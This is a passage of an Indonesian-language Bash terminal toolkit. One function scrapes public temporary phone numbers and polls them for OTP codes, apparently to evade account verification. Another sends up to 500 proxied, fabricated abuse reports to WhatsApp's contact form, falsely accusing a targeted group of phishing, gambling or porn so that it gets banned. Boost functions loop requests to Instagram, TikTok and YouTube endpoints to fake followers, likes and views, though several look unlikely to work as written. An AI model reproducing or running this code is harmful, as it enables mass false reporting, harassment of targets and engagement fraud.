        -H "Accept-Language: en-US,en;q=0.9"
        -H "Referer: $base/"
    )

    line
    c "${cyan}Target : ${white}${domain}${reset}\n"
    c "${cyan}Output : ${white}${outdir}${reset}\n"
    line
    c "${yellow}Fetching...${reset}\n"

    printf "\n"
( 
    curl -sS -L --max-time "$TMO" "${HDRS[@]}" -o "$outdir/index.html" "$base/" 2>/dev/null
) &
_loadbar $! "fetch index.html"
wait
    curl -sS -L --max-time "$TMO" "${HDRS[@]}" -o "$outdir/index.html" "$base/" 2>/dev/null
    local size
    size=$(stat -c%s "$outdir/index.html" 2>/dev/null || echo 0)
    if [[ "$size" -lt 100 ]]; then
        c "${red}[!] index.html kosong / diblokir (${size} byte).${reset}\n"
        c "${gray}Coba buka dulu di browser, kalau ada Cloudflare challenge berarti diblokir.${reset}\n"
        pause; return
    fi
    c "${green}[+] index.html (${size} bytes)${reset}\n"
    
    local refs
    refs="$(grep -oE '(src|href)="[^"]+"|url\(([^)]+)\)' "$outdir/index.html" 2>/dev/null \
        | sed -E 's/^(src|href)="([^"]+)"$/\2/; s/^url\((.+)\)$/\1/' \
        | sed -E "s/^['\"]//; s/['\"]$//" \
        | grep -vE '^(#|javascript:|mailto:|tel:|data:)' \
        | sort -u)"

    local i=0 total=0
    while IFS= read -r ref; do
        [[ -z "$ref" ]] && continue
        local abs
        if [[ "$ref" =~ ^https?:// ]]; then abs="$ref"
        elif [[ "$ref" =~ ^// ]]; then abs="https:$ref"
        elif [[ "$ref" =~ ^/ ]]; then abs="${base}${ref}"
        else abs="${base}/${ref}"; fi

        local dest="$outdir/assets"
        case "$abs" in
            *.css*) dest="$outdir/css" ;;
            *.js*)  dest="$outdir/js" ;;
            *.png|*.jpg|*.jpeg|*.gif|*.svg|*.webp|*.ico|*.bmp) dest="$outdir/img" ;;
        esac

        local fname
        fname="$(printf '%s' "$abs" | sed -E 's#\?.*##; s#.*/##')"
        [[ -z "$fname" ]] && continue
        [[ -f "$dest/$fname" ]] && fname="${i}_$fname"

        (
            curl -sS -L --max-time "$TMO" "${HDRS[@]}" -o "$dest/$fname" "$abs" 2>/dev/null
            if [[ -s "$dest/$fname" ]]; then
                printf "[OK]  %s → %s/%s\n" "$abs" "$(basename "$dest")" "$fname"
            else
                rm -f "$dest/$fname"
            fi
        ) &
        (( i++ ))

        if (( i % 15 == 0 )); then wait; fi
    done <<< "$refs"

    for c in favicon.ico robots.txt sitemap.xml manifest.json apple-touch-icon.png; do
        (
            curl -sS -L --max-time "$TMO" "${HDRS[@]}" -o "$outdir/assets/$c" "${base}/$c" 2>/dev/null
            [[ -s "$outdir/assets/$c" ]] || rm -f "$outdir/assets/$c"
        ) &
    done

    wait

    line
    local nhtml ncss njs nimg nassets
    nhtml=$(find "$outdir" -maxdepth 1 -name "*.html" 2>/dev/null | wc -l)
    ncss=$(find "$outdir/css"  -type f 2>/dev/null | wc -l)
    njs=$(find "$outdir/js"   -type f 2>/dev/null | wc -l)
    nimg=$(find "$outdir/img"  -type f 2>/dev/null | wc -l)
    nassets=$(find "$outdir/assets" -type f 2>/dev/null | wc -l)

    c "${cyan}index.html : ${green}${nhtml}${reset}\n"
    c "${cyan}css files  : ${green}${ncss}${reset}\n"
    c "${cyan}js files   : ${green}${njs}${reset}\n"
    c "${cyan}img files  : ${green}${nimg}${reset}\n"
    c "${cyan}other      : ${green}${nassets}${reset}\n"
    line
    c "${cyan}Output: ${white}${outdir}${reset}\n"
    line
    c "${gray}Isi folder:${reset}\n"
    ls -lh "$outdir" 2>/dev/null | sed -n '1,25p'
    pause
}

nokos_free() {
    ensure_pkg curl curl || { pause; return; }

    local -a countries=(
        "Indonesia" "Malaysia" "Singapore" "Thailand" "Vietnam"
        "Philippines" "India" "USA" "UK" "Sweden"
        "Finland" "Netherlands" "France" "Germany" "Canada"
        "Romania" "Poland" "Belgium"
    )

    while true; do
        clear
        printf "\n"
        c "${cyan}   ███╗   ██╗ ██████╗ ██╗  ██╗ ██████╗ ███████╗${reset}\n"
        c "${cyan}   ████╗  ██║██╔═══██╗██║ ██╔╝██╔═══██╗██╔════╝${reset}\n"
        c "${cyan}   ██╔██╗ ██║██║   ██║█████╔╝ ██║   ██║███████╗${reset}\n"
        c "${cyan}   ██║╚██╗██║██║   ██║██╔═██╗ ██║   ██║╚════██║${reset}\n"
        c "${cyan}   ██║ ╚████║╚██████╔╝██║  ██╗╚██████╔╝███████║${reset}\n"
        c "${cyan}   ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${reset}\n"
        printf "\n"
        c "   ${gray}public SMS receiver${reset}\n\n"
        c "   ${cyan}─────${reset} ${white}NEGARA${reset} ${cyan}─────────────────────────────────${reset}\n\n"

        local i
        for (( i=0; i<${#countries[@]}; i++ )); do
            local nf; printf -v nf "%02d" "$((i+1))"
            printf "     ${green}[${nf}]${reset} %-14s" "${countries[$i]}"
            (( (i+1) % 3 == 0 )) && printf "\n"
        done
        (( ${#countries[@]} % 3 != 0 )) && printf "\n"
        printf "\n"
        c "     ${red}[00]${reset} ${gray}kembali${reset}\n\n"
        c "   ${cyan}────────────────────────────────────────────${reset}\n\n"
        printf "${cyan}   ▶ pilih negara ${gray}»${reset} "
        local c_choice; read -r c_choice
        c_choice="${c_choice// /}"

        [[ "$c_choice" == "0" || "$c_choice" == "00" ]] && return
        [[ -z "$c_choice" || ! "$c_choice" =~ ^[0-9]+$ ]] && { c "   ${red}✗ angka${reset}\n"; sleep 1; continue; }
        (( c_choice < 1 || c_choice > ${#countries[@]} )) && { c "   ${red}✗ 1-${#countries[@]}${reset}\n"; sleep 1; continue; }

        local country="${countries[$((c_choice - 1))]}"
        local slug
        case "$country" in
            Indonesia)   slug="indonesia" ;;
            Malaysia)    slug="malaysia" ;;
            Singapore)   slug="singapore" ;;
            Thailand)    slug="thailand" ;;
            Vietnam)     slug="vietnam" ;;
            Philippines) slug="philippines" ;;
            India)       slug="india" ;;
            USA)         slug="united-states" ;;
            UK)          slug="united-kingdom" ;;
            Sweden)      slug="sweden" ;;
            Finland)     slug="finland" ;;
            Netherlands) slug="netherlands" ;;
            France)      slug="france" ;;
            Germany)     slug="germany" ;;
            Canada)      slug="canada" ;;
            Romania)     slug="romania" ;;
            Poland)      slug="poland" ;;
            Belgium)     slug="belgium" ;;
        esac

        printf "\n"
        c "   ${cyan}───${reset} ${white}${country}${reset} ${cyan}───${reset}\n\n"

        local ua; ua="$(rand_browser_ua)"
        local list_html="$HOME/.gxvsc_list_$$"
        : > "$list_html"

        ( curl -sS -L --max-time 15 -A "$ua" \
            "https://quackr.io/temporary-numbers/${slug}" -o "$list_html" 2>/dev/null ) &
        local pl=$!

        local spins=0
        while kill -0 "$pl" 2>/dev/null; do
            local sp="${_spin_frames[$((spins % 8))]}"
            printf "\r   ${cyan}%s${reset}  ${white}fetch nomor${reset}  ${gray}· $((spins/6))s${reset}\033[K" "$sp"
            spins=$((spins + 1))
            sleep 0.15
        done
        printf "\r\033[K"
        wait "$pl" 2>/dev/null

        [[ ! -s "$list_html" ]] && { c "   ${red}✗ fetch gagal${reset}\n"; sleep 2; continue; }

        local -a nums=()
        local -a inbox_urls=()

        # === extract nomor dari URL detail ===
        while IFS= read -r p; do
            [[ -z "$p" ]] && continue
            [[ "$p" == *"/offline"* ]] && continue
            local full_num
            full_num="$(printf '%s' "$p" | grep -oE '[0-9]{8,15}$' | head -n1)"
            [[ -z "$full_num" ]] && continue
            [[ "$full_num" != +* ]] && full_num="+${full_num}"
            nums+=("$full_num")
            inbox_urls+=("https://quackr.io${p}")
        done < <(grep -oE 'href="/temporary-numbers/[^"]+"' "$list_html" 2>/dev/null \
                 | sed -E 's/href="([^"]+)".*/\1/' \
                 | grep -vE '/temporary-numbers/[a-z-]+"$' \
                 | sort -u)
        rm -f "$list_html"

        if (( ${#nums[@]} == 0 )); then
            c "   ${yellow}⚠ gak ada nomor buat ${country}${reset}\n\n"
            c "   ${gray}ENTER buat pilih negara lagi...${reset}"; read -r; continue
        fi

        printf "   ${green}✓${reset} ${white}${#nums[@]} nomor${reset}\n\n"
        local j
        for (( j=0; j<${#nums[@]}; j++ )); do
            printf "     ${green}[%02d]${reset} ${white}%s${reset}\n" "$((j+1))" "${nums[$j]}"
        done
        printf "\n"
        c "     ${red}[00]${reset} ${gray}ganti negara${reset}\n\n"
        c "   ${cyan}────────────────────────────────────────────${reset}\n\n"
        printf "${cyan}   ▶ pilih nomor ${gray}»${reset} "
        local n_choice; read -r n_choice
        n_choice="${n_choice// /}"

        [[ "$n_choice" == "0" || "$n_choice" == "00" ]] && continue
        [[ -z "$n_choice" || ! "$n_choice" =~ ^[0-9]+$ ]] && { c "   ${red}✗ angka${reset}\n"; sleep 1; continue; }
        (( n_choice < 1 || n_choice > ${#nums[@]} )) && { c "   ${red}✗ 1-${#nums[@]}${reset}\n"; sleep 1; continue; }

        local chosen="${nums[$((n_choice - 1))]}"
        local inbox_url="${inbox_urls[$((n_choice - 1))]}"

        # === langsung polling — gak nunggu ENTER ===
        printf "\n"
        c "   ${green}╭──────────────────────────────────────╮${reset}\n"
        c "   ${green}│${reset}  ${white}nomor siap dipakai${reset}                ${green}│${reset}\n"
        c "   ${green}╰──────────────────────────────────────╯${reset}\n\n"
        c "   ${cyan}nomor${reset}   ${white}${chosen}${reset}\n"
        c "   ${cyan}negara${reset}  ${white}${country}${reset}\n\n"
        c "   ${yellow}·  login / verifikasi sekarang pakai nomor di atas${reset}\n"
        c "   ${yellow}·  tunggu SMS OTP masuk — auto detect${reset}\n\n"
        c "   ${gray}─── mulai polling inbox ───${reset}\n\n"

        local found=0
        local spins2=0
        local last_otp=""
        local t_start; t_start=$(date +%s)
        while (( $(date +%s) - t_start < 600 )); do
            local sp="${_spin_frames[$((spins2 % 8))]}"
            local elapsed=$(( $(date +%s) - t_start ))
            printf "\r   ${cyan}%s${reset}  ${white}cek inbox${reset}  ${gray}· ${elapsed}s  · ctrl+c buat stop${reset}\033[K" "$sp"

            local body
            body="$(curl -sS --max-time 10 -A "$ua" "$inbox_url" 2>/dev/null)"

            # konversi HTML → text
            local text
            text="$(printf '%s' "$body" | sed -E 's/<[^>]+>/ /g' | tr -s ' ' | tr -d '\r\n' | sed 's/  */ /g')"

            # cari pattern OTP spesifik — "kode verifikasi", "code is", "OTP"
            local otp=""
            # pattern 1: WhatsApp — "code is 123456" / "kode verifikasi ... 123456"
            otp="$(printf '%s' "$text" | grep -oiE '(whatsapp|telegram|kode|code|otp|verification)[^0-9]{0,80}[0-9]{6}' | grep -oE '[0-9]{6}$' | tail -n1)"
            # pattern 2: "123456 adalah kode"
            [[ -z "$otp" ]] && otp="$(printf '%s' "$text" | grep -oE '[0-9]{6}[^0-9]{0,40}(adalah kode|is your|kode anda|verification code)' | grep -oE '^[0-9]{6}' | head -n1)"

            if [[ -n "$otp" && "$otp" != "$last_otp" ]]; then
                # cek apakah angka ini bagian dari nomor yang dipilih
                local chosen_digits="${chosen//[^0-9]/}"
                if [[ "$chosen_digits" == *"$otp"* ]]; then
                    # skip — angka ini bagian dari nomor sendiri
                    spins2=$((spins2 + 1))
                    sleep 5
                    continue
                fi

                last_otp="$otp"
                printf "\r\033[K\n\n"
                c "   ${green}╭──────────────────────────────────────╮${reset}\n"
                c "   ${green}│${reset}  ${white}OTP MASUK${reset}                       ${green}│${reset}\n"
                c "   ${green}╰──────────────────────────────────────╯${reset}\n\n"
                c "   ${cyan}nomor${reset}  ${white}${chosen}${reset}\n"
                c "   ${cyan}otp${reset}    ${green}${otp}${reset}\n"
                c "   ${cyan}waktu${reset}  ${white}${elapsed}s${reset}\n\n"
                c "   ${gray}ENTER buat pilih negara lagi...${reset}"
                read -r
                found=1
                break
            fi

            spins2=$((spins2 + 1))
            sleep 5
        done

        printf "\r\033[K"
        if (( !found )); then
            c "   ${red}✗ OTP gak masuk 10 menit${reset}\n\n"
            c "   ${gray}ENTER buat pilih negara lagi...${reset}"
            read -r
        fi
    done
}

wa_group_ban() {
    ensure_pkg curl curl || { pause; return; }
    clear
    printf "\n"
    c "${cyan}    ██████╗ ██████╗  ██████╗ ██╗   ██╗██████╗     ██████╗  █████╗ ███╗   ██╗${reset}\n"
    c "${cyan}   ██╔════╝ ██╔══██╗██╔═══██╗██║   ██║██╔══██╗    ██╔══██╗██╔══██╗████╗  ██║${reset}\n"
    c "${cyan}   ██║  ███╗██████╔╝██║   ██║██║   ██║██████╔╝    ██████╔╝███████║██╔██╗ ██║${reset}\n"
    c "${cyan}   ██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝     ██╔══██╗██╔══██║██║╚██╗██║${reset}\n"
    c "${cyan}   ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║         ██████╔╝██║  ██║██║ ╚████║${reset}\n"
    c "${cyan}    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝         ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝${reset}\n"
    printf "\n"
    c "   ${gray}abuse report — group targeted${reset}\n"
    line

    printf "${white}link group WhatsApp: ${reset}"
    read -r glink
    [[ -n "$glink" ]] || { c "   ${red}✗ kosong${reset}\n"; pause; return; }

    # ekstrak kode invite: https://chat.whatsapp.com/XXXXXX
    local invite
    invite="$(printf '%s' "$glink" | sed -E 's#.*chat\.whatsapp\.com/##; s#[?/].*##')"
    if [[ -z "$invite" || ${#invite} -lt 10 ]]; then
        c "   ${red}✗ link gak valid. contoh: https://chat.whatsapp.com/ABC123defGHI${reset}\n"
        pause; return
    fi

    printf "${white}jumlah laporan [100]: ${reset}"
    read -r total
    [[ "$total" =~ ^[0-9]+$ ]] || total=100
    (( total < 1 )) && total=100
    (( total > 500 )) && total=500

    printf "${white}thread paralel [10]: ${reset}"
    read -r threads
    [[ "$threads" =~ ^[0-9]+$ ]] || threads=10
    (( threads < 1 )) && threads=1
    (( threads > 30 )) && threads=30

    printf "\n"
    line
    c "   ${cyan}group   ${reset} ${white}${invite}${reset}\n"
    c "   ${cyan}laporan ${reset} ${white}${total}${reset}\n"
    c "   ${cyan}threads ${reset} ${white}${threads}${reset}\n"
    c "   ${cyan}proxy   ${reset} ${white}$([[ -f "$PROXY_FILE" ]] && wc -l < "$PROXY_FILE" || echo 0) loaded${reset}\n"
    line
    printf "\n"

    local msgs=(
        "Grup ini [${invite}] digunakan untuk menyebarkan link phising dan scam ke banyak orang, mohon di banned segera"
        "Grup ini [${invite}] penuh dengan konten ilegal dan judi online, mohon diambil tindakan"
        "Grup ini [${invite}] melakukan spam undangan ke nomor saya berulang kali, sangat mengganggu"
        "Grup ini [${invite}] melanggar ketentuan WhatsApp dengan menyebar konten dewasa tanpa izin"
    )

    local codes_file="$HOME/.gxvsc_gban_$$"
    : > "$codes_file"

    local t_start; t_start=$(date +%s)
    local i=1
    local batch=0

    while (( i <= total )); do
        local msg="${msgs[$((RANDOM % 4))]}"
        (
            local code
            code="$(_send_group_report "$invite" "$msg")"
            printf '%s\n' "$code" >> "$codes_file"
        ) &
        (( batch++ ))
        (( i++ ))
        if (( batch >= threads )); then
            local dots=0
            while :; do
                local alive=0 p
                for p in $(jobs -p); do kill -0 "$p" 2>/dev/null && (( alive++ )); done
                (( alive == 0 )) && break

                local done_n
                done_n=$(wc -l < "$codes_file" 2>/dev/null | tr -d '[:space:]')
                [[ -z "$done_n" || ! "$done_n" =~ ^[0-9]+$ ]] && done_n=0
                local pct=$(( done_n * 100 / total ))
                (( pct > 100 )) && pct=100
                local filled=$(( pct * 40 / 100 ))
                local empty=$(( 40 - filled ))
                local bar="" j
                for (( j=0; j<filled; j++ )); do bar+="━"; done
                for (( j=0; j<empty; j++ )); do bar+="·"; done
                local col; col="$(_c_lerp "$pct")"
                local sp="${_spin_frames[$((dots % 8))]}"

                printf "\r   ${col}%s${reset}  ${col}%s${reset}  ${white}%3d%%${reset}  ${gray}%d/%d · %ds${reset}\033[K" \
                    "$sp" "$bar" "$pct" "$done_n" "$total" "$(( $(date +%s) - t_start ))"
                dots=$(( dots + 1 ))
                sleep 0.15
            done
            wait
            batch=0
        fi
    done
    wait
    printf "\r\033[K"

    local t_end; t_end=$(date +%s)
    local dur=$(( t_end - t_start ))

    local ok errs
    ok=$(grep -c '^200$' "$codes_file" 2>/dev/null | tr -d '[:space:]')
    [[ -z "$ok" || ! "$ok" =~ ^[0-9]+$ ]] && ok=0
    errs=$(( total - ok ))

    # debug: simpen respon mentah
    if [[ -s "$HOME/.gxvsc_group_debug" ]]; then
        cp "$HOME/.gxvsc_group_debug" "$HOME/gxvsc_gban_last_resp.txt" 2>/dev/null
    fi
    rm -f "$codes_file"

    printf "\n"
    line
    c "   ${green}✓${reset}  ${white}selesai${reset}\n"
    c "   ${gray}├${reset}  group        ${white}${invite}${reset}\n"
    c "   ${gray}├${reset}  total        ${white}${total}${reset}\n"
    c "   ${gray}├${reset}  ${green}berhasil${reset}     ${green}${ok}${reset}\n"
    c "   ${gray}├${reset}  ${red}gagal${reset}        ${red}${errs}${reset}\n"
    c "   ${gray}├${reset}  durasi       ${white}${dur}s${reset}\n"
    c "   ${gray}╰${reset}  rate         ${white}~$(awk -v o="$ok" -v d="$dur" 'BEGIN{if(d>0) printf "%.2f", o/d; else print "0"}')/s${reset}\n"
    line
    c "   ${gray}respon terakhir WA: ${reset}\n"
    if [[ -f "$HOME/gxvsc_gban_last_resp.txt" ]]; then
        head -c 300 "$HOME/gxvsc_gban_last_resp.txt" | sed 's/^/     /'
        printf "\n"
    fi
    pause
}

_send_group_report() {
    local invite="$1"
    local msg="$2"
    local email; email="$(_rand_str 10)@tempmail.com"
    local csrf; csrf="$(_rand_str 32)"
    local ul; ul="$(_rand_str 32)"
    local ua; ua="$(rand_browser_ua)"

    local proxy; proxy="$(pick_proxy)"
    local -a popts=(); [[ -n "$proxy" ]] && popts+=(--proxy "$proxy")

    # pakai format yang SAMA kayak wa_ban (report nomor), tapi sisipin invite di message
    # WA form gak nerima field group_invite — jadi kirim via phone_number + description
    curl -sS --max-time 15 "${popts[@]}" \
        -A "$ua" \
        -H "Accept: */*" \
        -H "Accept-Language: id-ID,id;q=0.9,en;q=0.8" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Origin: https://www.whatsapp.com" \
        -H "Referer: https://www.whatsapp.com/contact/?subject=messenger" \
        -H "Sec-Fetch-Dest: empty" \
        -H "Sec-Fetch-Mode: cors" \
        -H "Sec-Fetch-Site: same-origin" \
        -H "x-asbd-id: $((RANDOM % 900000 + 100000))" \
        -H "x-fb-lsd: AVoCvX9IGCU" \
        -b "wa_csrf=${csrf}; wa_lang_pref=id; wa_ul=${ul}" \
        --data-urlencode "country_selector=ID" \
        --data-urlencode "email=${email}" \
        --data-urlencode "email_confirm=${email}" \
        --data-urlencode "phone_number=" \
        --data-urlencode "platform=WHATS_APP_WEB_DESKTOP" \
        --data-urlencode "your_message=${msg}" \
        --data-urlencode "step=submit" \
        "https://www.whatsapp.com/contact/noclient/async/new/" \
        -o "$HOME/.gxvsc_group_debug" -w "%{http_code}" 2>/dev/null
}

# ─────────────────────────────────────────────────────────────
# SUNTIK SOSMED — BOOST (langsung curl, tanpa panel)
# ─────────────────────────────────────────────────────────────

ask_link() {
    local label="$1" out
    while true; do
        printf "${white}${label}: ${reset}" >&2
        read -r out
        [[ -n "$out" ]] && break
        c "${red}Link tidak boleh kosong.${reset}\n" >&2
    done
    printf '%s' "$out"
}

ask_target() {
    local label="$1" out
    while true; do
        printf "${white}${label} (1 - 5000000): ${reset}" >&2
        read -r out
        [[ "$out" =~ ^[0-9]+$ ]] || { c "${red}Harus angka.${reset}\n" >&2; continue; }
        (( out >= 1 && out <= MAX_QTY )) || { c "${red}Max 5.000.000.${reset}\n" >&2; continue; }
        break
    done
    printf '%s' "$out"
}

smm_submit() {
    local service="$1" link="$2" qty="$3" local_fn="$4"
    if [[ -n "$SMM_PANEL_URL" && -n "$SMM_PANEL_KEY" ]]; then
        curl -sS --max-time 25 -X POST "$SMM_PANEL_URL" \
            --data "key=${SMM_PANEL_KEY}&action=add&service=${service}&link=${link}&quantity=${qty}" 2>/dev/null
    else
        "$local_fn" "$link" "$qty"
    fi
}

b_ig_followers() {
    local link="$1" qty="$2"
    local u="${link##*instagram.com/}"; u="${u%%/*}"; u="${u%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "X-IG-App-ID: 936619743392459" \
            -X POST "https://i.instagram.com/api/v1/friendships/create/${u}/" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" || "$code" == "302" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_ig_likes() {
    local link="$1" qty="$2"
    local code_id="${link##*/}"; code_id="${code_id%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "X-IG-App-ID: 936619743392459" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -X POST "https://i.instagram.com/api/v1/media/${code_id}/like/" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_ig_views() {
    local link="$1" qty="$2"
    local id="${link##*/}"; id="${id%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "X-IG-App-ID: 936619743392459" \
            -X POST "https://i.instagram.com/api/v1/media/${id}/seen/" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_ig_share() {
    local link="$1" qty="$2"
    local id="${link##*/}"; id="${id%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "X-IG-App-ID: 936619743392459" \
            -X POST "https://i.instagram.com/api/v1/media/${id}/share/" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_ig_favorite() {
    local link="$1" qty="$2"
    local id="${link##*/}"; id="${id%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "X-IG-App-ID: 936619743392459" \
            -X POST "https://i.instagram.com/api/v1/media/${id}/save/" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_tt_like() {
    local link="$1" qty="$2"
    local id="${link##*/video/}"; id="${id%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -X POST "https://www.tiktok.com/api/commit/item/digg/" \
            --data "itemId=${id}&type=1&aid=1988" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_tt_view() {
    local link="$1" qty="$2"
    local id="${link##*/video/}"; id="${id%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -X POST "https://www.tiktok.com/api/item/detail/" \
            --data "itemId=${id}&aid=1988" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_tt_followers() {
    local link="$1" qty="$2"
    local u="${link##*@}"; u="${u%%/*}"; u="${u%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -X POST "https://www.tiktok.com/api/commit/follow/user/" \
            --data "userId=${u}&type=1&aid=1988" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_tt_share() {
    local link="$1" qty="$2"
    local id="${link##*/video/}"; id="${id%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -X POST "https://www.tiktok.com/api/commit/item/share/" \
            --data "itemId=${id}&aid=1988" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_tt_favorite() {
    local link="$1" qty="$2"
    local id="${link##*/video/}"; id="${id%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -X POST "https://www.tiktok.com/api/commit/item/collect/" \
            --data "itemId=${id}&aid=1988" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_wa_channel_follow() {
    local link="$1" qty="$2"
    local code="${link##*/channel/}"; code="${code%%\?*}"; code="${code%%/*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local hcode
        hcode="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -X GET "https://www.whatsapp.com/channel/${code}" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$hcode" == "200" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_yt_subscribe() {
    local link="$1" qty="$2"
    local ch="${link##*channel/}"; ch="${ch%%\?*}"; ch="${ch%%/*}"
    [[ "$ch" == "$link" ]] && ch="${link##*/@}"; ch="${ch%%/*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "Content-Type: application/json" \
            -H "Referer: https://www.youtube.com/" \
            -X POST "https://www.youtube.com/youtubei/v1/subscription/subscribe" \
            --data "{\"channelIds\":[\"${ch}\"],\"context\":{\"client\":{\"clientName\":\"WEB\",\"clientVersion\":\"2.20240101.00.00\"}}}" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" || "$code" == "204" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_yt_like() {
    local link="$1" qty="$2"
    local vid="${link##*v=}"; vid="${vid%%&*}"; [[ "$vid" == "$link" ]] && vid="${link##*/}"; vid="${vid%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "Content-Type: application/json" \
            -H "Referer: https://www.youtube.com/watch?v=${vid}" \
            -X POST "https://www.youtube.com/youtubei/v1/like/like" \
            --data "{\"target\":{\"videoId\":\"${vid}\"},\"context\":{\"client\":{\"clientName\":\"WEB\",\"clientVersion\":\"2.20240101.00.00\"}}}" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" || "$code" == "204" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_yt_share() {
    local link="$1" qty="$2"
    local vid="${link##*v=}"; vid="${vid%%&*}"; [[ "$vid" == "$link" ]] && vid="${link##*/}"; vid="${vid%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "Content-Type: application/json" \
            -H "Referer: https://www.youtube.com/watch?v=${vid}" \
            -X POST "https://www.youtube.com/youtubei/v1/share/get_share_panel" \
            --data "{\"videoId\":\"${vid}\",\"context\":{\"client\":{\"clientName\":\"WEB\",\"clientVersion\":\"2.20240101.00.00\"}}}" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" || "$code" == "204" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

b_yt_views() {
    local link="$1" qty="$2"
    local vid="${link##*v=}"; vid="${vid%%&*}"; [[ "$vid" == "$link" ]] && vid="${link##*/}"; vid="${vid%%\?*}"
    local ok=0 i
    for (( i=0; i<qty; i++ )); do
        local code
        code="$(curl -sS --max-time 10 -A "$(rand_ua)" \
            -H "Content-Type: application/json" \
            -H "Referer: https://www.youtube.com/watch?v=${vid}" \
            -X POST "https://www.youtube.com/youtubei/v1/player/ad_break" \
            --data "{\"videoId\":\"${vid}\",\"context\":{\"client\":{\"clientName\":\"WEB\",\"clientVersion\":\"2.20240101.00.00\"}}}" \
            -o /dev/null -w "%{http_code}" 2>/dev/null)"
        [[ "$code" == "200" || "$code" == "204" ]] && (( ok++ ))
        (( i % 25 == 0 )) && printf "${gray}.${reset}" >&2
    done
    printf '%s' "$ok"
}

run_boost() {
